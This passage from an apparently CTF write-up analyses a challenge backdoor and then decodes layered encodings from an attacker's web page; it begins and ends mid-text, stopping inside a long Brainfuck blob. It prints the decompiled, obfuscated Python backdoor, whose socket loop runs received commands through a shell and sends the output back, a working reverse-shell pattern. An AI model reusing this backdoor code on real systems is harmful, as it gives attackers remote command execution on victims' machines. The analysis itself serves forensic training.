---\\t\\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\\t\\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\\t\\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\\t\\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\\t\\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\\t\\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\\t\\t--- END PRIVATE KEY ---\u0026#39; ssls.send(str.encode(str(os.getcwd()) + \u0026#39;\u0026lt;\u0026#39; + \u0026#39;\u0026#39;.join([xbx[x] for x in tt]) + \u0026#39;\u0026gt;\u0026#39; + \u0026#39; \u0026gt; \u0026#39;)) except socket.error as O0OO000O0OO0000OO: try: try: print(\u0026#39;socket conn error: \u0026#39; + str(O0OO000O0OO0000OO)) finally: O0OO000O0OO0000OO = None del O0OO000O0OO0000OO finally: O0OO000O0OO0000OO = None del O0OO000O0OO0000OO def zszszs(): while True: O00OO000O00OOO0O0 = ssls.recv(1024) O00OO000O00OOO0O0 = O00OO000O00OOO0O0.decode(\u0026#39;utf-8\u0026#39;).strip() print(\u0026#39;received \u0026#39; + O00OO000O00OOO0O0) if O00OO000O00OOO0O0[:2] == \u0026#39;cd\u0026#39;: os.chdir(O00OO000O00OOO0O0[3:]) ssls.send(str.encode(str(os.getcwd()) + \u0026#39; \u0026gt; \u0026#39;)) else: if len(O00OO000O00OOO0O0) \u0026gt; 0: OO0000OO0O0000OO0 = subprocess.Popen(O00OO000O00OOO0O0, shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE), stdin=(subprocess.PIPE)) O000000000O0OOO00 = OO0000OO0O0000OO0.stdout.read() + OO0000OO0O0000OO0.stderr.read() O0000O0O0OO0O0OO0 = str(O000000000O0OOO00.decode(\u0026#39;utf-8\u0026#39;)) ssls.send(str.encode(O0000O0O0OO0O0OO0 + str(os.getcwd()) + \u0026#39; \u0026gt; \u0026#39;)) if len(O0000O0O0OO0O0OO0.split(\u0026#39;\\n\u0026#39;)) \u0026gt; 2: OO0O00OOO00OO0OO0 = 2 else: OO0O00OOO00OO0OO0 = 0 print(\u0026#39;Sent: \u0026#39; + OO0O00OOO00OO0OO0 * \u0026#39;\\n\u0026#39; + O0000O0O0OO0O0OO0) if not O00OO000O00OOO0O0: break s.close() def main(): sczsz() cscsz() zszszs() if __name__ == \u0026#39;__main__\u0026#39;: main() It looks like the flag is being merged from two factors which they are :\n1 tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421] And\n1 xbx = \u0026#39;--- BEGIN PRIVATE KEY ---\\t\\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\\t\\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\\t\\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\\t\\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\\t\\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\\t\\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\\t\\t--- END PRIVATE KEY ---\u0026#39; and also encrypted.\nLet\u0026rsquo;s make our script to get the flag.\n1 2 3 4 5 6 tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421] xbx = \u0026#39;--- BEGIN PRIVATE KEY ---\\t\\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\\t\\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\\t\\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\\t\\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\\t\\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\\t\\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\\t\\t--- END PRIVATE KEY ---\u0026#39; for i in tt: print(xbx[i],end=\u0026#34;\u0026#34;) Here it is!\nThe fourth flag :\nflag{b4ckd00rs_4r3_us3ful_f0r_p3rs1st3nc3}\n5-Know your enemy Now our duty is to investigate the source of the attack, Let\u0026rsquo;s see this web page!\nIt look like a normal web page, We can see the source page.\nNothing much to see. Let\u0026rsquo;s head back and see what will happen if we submitted any fake e-mail.\nmhmm, Let\u0026rsquo;s see what is going on in the web console.\nWow, It looks like when we submit any e-mail, we recieve this output in the web console.\nI think there is base64 in the end of the output.\n1 Rm9sbG93aW5nIHRoZSBjcnVtYmxlcyBhcmUgd2U/IFZlcnkgZ29vZCwgeW91IHdpbGwgbmVlZCB0aGUga2V5ICdoeXBlcmlvbicgdG8gam9pbiB1czogWnJ4cGMgcHNlbD8gRWRzdSwgdHNnJ3ogcXRpIHpuIG1iYiBhcHIgZGlibm5jIGlsemEgY2FsOiBcdjQ5XG02aVxvNzRcZjY1XGw3MlxrNjVcZTczXHY3NFxtNjlcYjZ2XGY2N1xsMnJcZTJjXG0yaVxvMjBcZjRyXGs2MVxlNzlcdjYyXG02NVxiMjBcbzc5XGY2dFxrNzVcZTIwXHY2M1xtNjFcYjZ2XGYyMFxsNjJcazY1XGUyMFx2NjFcbTIwXGI3N1xvNm5cbDcyXGs3NFxlNjhcdjc5XG0yMFxiNjFcbzczXGY3M1xsNjVcazc0XGUyMFx2NjZcbTZqXG83MlxmMjBcbDQ4XGs3OVxlNzBcdjY1XG03MlxiNjlcbzZuXGw2clxlM3lcbTIwXGI0MVxvNzZcZjcwXGw3MlxrNzlcZTZhXG0yMFxiNzFcbzYyXGY2MVxsNzJcazIxXGUyMFx2NHJcYjYyXG82OFxmMjBcbDcwXGs2bFx2NjFcbTIwXGI2MVxvNjJcZjZvXGsyMFxlNjhcdjY2XG03MlxiMjBcbzY3XGY3NVxsNzZcazY2XGUzeVxtMjBcYjQzXG80MlxmNDZcbDQ3XGsyMFxlMmRcbTZpXG82M1xmNzZcbDJzXGU3Nlx2NjFcbTY5XGI3NlxvNjdcZjcyXGwyc1xlNzRcdjcyXG02MVxiNzJcbzY1XGY2c1xrNjdcZTcyCgoKCg== Let\u0026rsquo;s decode it and see!\nOoh, It turned into another way of encryption which i believe is Vigenère Cipher, Let\u0026rsquo;s decrypt it!\nAnother encoding which is i think is Hexa-decimal, Let\u0026rsquo;s decode it!\nMore Encryption!!\nThis time is Caesar Cipher if i\u0026rsquo;m not wrong, Let\u0026rsquo;s encrypt it!\nWell, This time we need to make a POST request using our beloved Burpsuite, Let\u0026rsquo;s do it.\n1 ++++++++[\u0026gt;+\u0026gt;++\u0026gt;+++\u0026gt;++++\u0026gt;+++++\u0026gt;++++++\u0026gt;+++++++\u0026gt;++++++++\u0026gt;+++++++++\u0026gt;++++++++++\u0026gt;+++++++++++\u0026gt;++++++++++++\u0026gt;+++++++++++++\u0026gt;++++++++++++++\u0026gt;+++++++++++++++\u0026gt;++++++++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\